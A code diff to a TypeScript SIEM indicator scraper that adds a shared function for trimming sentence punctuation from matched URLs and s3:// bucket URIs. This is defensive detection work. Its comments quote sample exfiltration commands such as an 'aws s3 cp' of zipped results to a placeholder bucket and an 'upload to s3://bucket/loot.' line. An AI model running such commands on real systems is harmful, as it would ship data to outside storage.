@@ -51,6 +51,33 @@ const TEXT_BOT_ASSIGNED =
 // exfil runner uses — `aws s3 cp results/*.zip s3://bucket/prefix/` — reached no scraper at all.
 const TEXT_S3_URI = /\bs3:\/\/[a-z0-9][a-z0-9.\-]{1,61}[a-z0-9](?:\/[^\s"'<>)\]}]*)?/gi;
 
+// Punctuation that ends a URI written into prose rather than the URI itself. A trailing SLASH is
+// absent from the class on purpose: it is part of a bucket prefix, not the sentence.
+const TRAILING_SENTENCE_PUNCTUATION = /[.,;:)\]]+$/;
+
+/**
+ * Drop the sentence's punctuation from the end of a matched URI — unless a quote proves the
+ * punctuation belongs to the URI.
+ *
+ * `upload to s3://bucket/loot.` ends a sentence, so the period is the writer's, and keeping it
+ * stores a destination that is not a usable URI and duplicates the same bucket written without it.
+ *
+ * `aws s3 cp x 's3://bucket/evidence.'` is the opposite case. An S3 object key may legally end in a
+ * dot, and the closing quote says where the value ends — no sentence is being punctuated inside it.
+ * Stripping there records a destination the script never used. The URI counts as quote-delimited
+ * only when the character immediately before it opens a quote AND the character immediately after
+ * it closes the SAME one, so `he said "go to s3://bucket/evidence."` still strips: the quote wraps
+ * the sentence, not the URI.
+ *
+ * Both scrapers call this, because #744 was filed about the two disagreeing over one destination.
+ */
+function trimSentencePunctuation(match: string, text: string, index: number): string {
+  const opener = index > 0 ? text[index - 1] : "";
+  const closer = text[index + match.length] ?? "";
+  if ((opener === '"' || opener === "'") && closer === opener) return match;
+  return match.replace(TRAILING_SENTENCE_PUNCTUATION, "");
+}
+
 // URLs, IPv4, SHA256/SHA1/MD5 hashes, domains, CVE ids, Telegram bot handles and s3:// URIs. The
 // domain pass came first: a collected script block names its C2 by name at least as often as by
 // address, and until `extractDomains` ran here those names were simply lost (#648). The last three
@@ -58,7 +85,8 @@ const TEXT_S3_URI = /\bs3:\/\/[a-z0-9][a-z0-9.\-]{1,61}[a-z0-9](?:\/[^\s"'<>)\]}
 // the channel it reports hits on, and the bucket it ships them to, all in plain text.
 export function scrapeText(text: string, sink: Map<string, SiemIoc>): void {
   if (!text) return;
-  for (const m of text.matchAll(TEXT_URL)) addIoc(sink, "url", m[0].replace(/[.,;:)\]]+$/, "").slice(0, 300));
+  for (const m of text.matchAll(TEXT_URL))
+    addIoc(sink, "url", trimSentencePunctuation(m[0], text, m.index ?? 0).slice(0, 300));
   for (const m of text.matchAll(TEXT_IPV4)) {
     // A dotted quad written right after a version marker is a version string, not an address:
     // `choco install openssh --version 8.0.0.1`, `$script:ModuleVersion = '1.0.0.0'`. Octet bounds
@@ -76,12 +104,11 @@ export function scrapeText(text: string, sink: Map<string, SiemIoc>): void {
   // once written out — yields one indicator rather than two spellings of it.
   for (const m of text.matchAll(TEXT_BOT_HANDLE)) addIoc(sink, "other", m[0]);
   for (const m of text.matchAll(TEXT_BOT_ASSIGNED)) addIoc(sink, "other", `@${m[1]}`);
-  // Same trailing-punctuation strip the URL pass above runs, for the same reason: a bucket named
-  // mid-sentence would otherwise be stored as "s3://b/prefix," — not a usable URI, and a second
-  // indicator for a destination already recorded without the comma (#744). A trailing SLASH is
-  // part of the prefix, not punctuation, so it is not in the class and survives.
+  // The same trim the URL pass runs, by the same function: a bucket named mid-sentence would
+  // otherwise be stored as "s3://b/prefix," — not a usable URI, and a second indicator for a
+  // destination already recorded without the comma (#744).
   for (const m of text.matchAll(TEXT_S3_URI))
-    addIoc(sink, "other", m[0].replace(/[.,;:)\]]+$/, "").slice(0, 300));
+    addIoc(sink, "other", trimSentencePunctuation(m[0], text, m.index ?? 0).slice(0, 300));
 }
 
 // The free-text fields that carry a detection's evidence (and its embedded IOCs). `ScriptBlockText`
